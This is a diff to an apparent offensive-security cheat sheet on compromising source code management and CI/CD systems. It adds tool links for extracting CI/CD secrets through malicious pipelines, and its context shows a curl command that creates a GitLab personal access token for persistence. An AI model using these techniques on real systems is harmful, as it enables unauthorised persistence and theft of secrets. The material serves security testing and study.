@@ -1,16 +1,23 @@
-# Source Code Management
+# Source Code Management & CI/CD Compromise
 
 > 
 
 ## Summary
 
-* [Enumeration](#enumeration)
-* [Exploit Gitlab CI/Github Actions](#exploit-gitlab-cigithub-actions)
+* [Tools](#tools)
+* [Enumerate repositories files and secrets](#enumerate-repositories-files-and-secrets)
+* [Personal Access Token](#personal-access-token)
+* [Gitlab CI/Github Actions](#gitlab-cigithub-actions)
 * [References](#references)
 
 
-## Enumeration
+## Tools
 
+* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) - List the secrets stored inside CI/CD environments and extract them by deploying malicious pipelines
+* [xforcered/SCMKit](https://github.com/xforcered/SCMKit) - Source Code Management Attack Toolkit
+
+
+## Enumerate repositories files and secrets
 
 Using [SCMKit - Source Code Management Attack Toolkit](https://github.com/xforcered/SCMKit)
 
@@ -80,7 +87,7 @@ Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab i
 curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-persistence-token" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens"
 ```
 
-## Exploit Gitlab CI/Github Actions
+## Gitlab CI/Github Actions
 
 * Gitlab-CI "Command Execution" example: `.gitlab-ci.yml`
     ```yaml
@@ -123,3 +130,4 @@ curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-pers
 ## References
 
 * [Controlling the Source: Abusing Source Code Management Systems - Brett Hawkins - August 9, 2022](https://securityintelligence.com/posts/abusing-source-code-management-systems/)
+* [CI/CD SECRETS EXTRACTION, TIPS AND TRICKS - Hugo Vincent, Théo Louis-Tisserand - 01/03/2023](https://www.synacktiv.com/publications/cicd-secrets-extraction-tips-and-tricks.html)
